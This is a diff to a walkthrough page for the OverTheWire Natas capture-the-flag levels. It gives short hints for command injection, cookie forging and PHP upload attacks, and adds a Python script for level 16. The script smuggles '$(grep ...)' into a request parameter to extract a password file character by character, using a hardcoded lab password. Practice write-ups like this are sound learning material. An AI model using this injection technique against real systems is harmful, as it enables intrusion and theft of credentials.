@@ -193,13 +193,13 @@
 <h2 id="level-7"><a class="header" href="#level-7">Level 7</a></h2>
 <p>Check the HTML. It has a comment stating the page that has the password. Use that as a query in the URL to view the page.</p>
 <h2 id="level-8"><a class="header" href="#level-8">Level 8</a></h2>
-<p>Check the PHP source they are providing. Obtain the string from the hexadecimal, reverse it, and do a <code>base64</code> decode on it.</p>
+<p>Check the PHP source they are providing. Get the string from the hexadecimal, reverse it, and do a <code>base64</code> decode on it.</p>
 <h2 id="level-9"><a class="header" href="#level-9">Level 9</a></h2>
 <p>Comment out the query and grep the file that has the password since the input goes unsantized to passthru.</p>
 <h2 id="level-10"><a class="header" href="#level-10">Level 10</a></h2>
 <p>Do the same as before. Asterisk, period and forward slashes are not there in the filtered characters.</p>
 <h2 id="level-11"><a class="header" href="#level-11">Level 11</a></h2>
-<p><code>base64</code> decode the data cookie. XOR it with the given cookie to obtain the XOR key. Once the key is obtained use it to change the cookie value to yes and encrypt it. Then send that as the cookie.</p>
+<p><code>base64</code> decode the data cookie. XOR it with the given cookie to get the XOR key. Once the key is received use it to change the cookie value to yes and encrypt it. Then send that as the cookie.</p>
 <h2 id="level-12"><a class="header" href="#level-12">Level 12</a></h2>
 <p>Create a <code>.php</code> file to cat the password. Change the html to send a php through the form instead of a jpg. Send it and open it in the browser.</p>
 <h2 id="level-13"><a class="header" href="#level-13">Level 13</a></h2>
@@ -227,6 +227,63 @@ while(True):
         # print(r.text)
         if "This user exists" in r.text:
             iter += 1
+            password += i
+            print(password)
+</code></pre>
+<h2 id="level-16"><a class="header" href="#level-16">Level 16</a></h2>
+<pre><code class="language-py">#!/usr/bin/python
+
+import requests
+import string
+
+url = "http://natas16.natas.labs.overthewire.org"
+auth_username = "natas16"
+auth_password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
+
+characters = string.ascii_letters + string.digits
+
+# print(characters)
+
+default_needle = "Africans"
+
+password_chars = ""
+
+iter = 1
+
+print("chars = ", end="")
+
+for i in characters:
+    r = requests.get(
+        url,
+        auth=(auth_username, auth_password),
+        params={
+            "needle": default_needle + "$(grep " + i + " /etc/natas_webpass/natas17)"
+        },
+    )
+    # print(r.text)
+    if default_needle not in r.text:
+        password_chars += i
+        print(i, end="", flush=True)
+
+print()
+
+print("password chars = ", password_chars)
+password = ""
+
+while True:
+    for i in password_chars:
+        r = requests.get(
+            url,
+            auth=(auth_username, auth_password),
+            params={
+                "needle": default_needle
+                + "$(grep ^"
+                + password
+                + i
+                + " /etc/natas_webpass/natas17)"
+            },
+        )
+        if default_needle not in r.text:
             password += i
             print(password)
 </code></pre>
